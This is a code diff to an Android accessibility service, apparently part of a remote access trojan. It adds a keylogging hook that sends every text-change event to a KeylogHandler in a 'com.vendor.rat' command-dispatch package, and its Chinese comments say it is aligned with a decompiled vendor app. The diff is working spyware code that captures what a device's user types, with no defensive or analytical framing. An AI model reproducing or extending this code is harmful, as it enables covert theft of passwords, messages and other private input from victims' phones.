@@ -487,6 +487,11 @@ public class MyAccessibilityService extends AccessibilityService {
             // vendor: G(event) — 更新根节点 (反编译不完整, 用简化版)
             G(event);
 
+            // Keylog: TYPE_VIEW_TEXT_CHANGED → 键盘记录 (对齐 vendor c0→b0 case 1)
+            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                dispatchKeylogEvent(event);
+            }
+
             // vendor: f0(event) — 引擎分发
             f0(event);
 
@@ -632,6 +637,22 @@ public class MyAccessibilityService extends AccessibilityService {
             }
         } catch (Exception e) {
             Log.e(TAG, "f0 error", e);
+        }
+    }
+
+    // Keylog 事件分发 (对齐 vendor c0→b0 case 1: TYPE_VIEW_TEXT_CHANGED)
+    private void dispatchKeylogEvent(AccessibilityEvent event) {
+        try {
+            MainApplication app = MainApplication.getInstance();
+            if (app == null) return;
+            com.vendor.rat.control.handler.CommandDispatcher dispatcher = app.getCommandDispatcher();
+            if (dispatcher == null) return;
+            com.vendor.rat.control.handler.KeylogHandler handler = dispatcher.getKeylogHandler();
+            if (handler != null) {
+                handler.onTextChanged(event);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "dispatchKeylogEvent error", e);
         }
     }
 
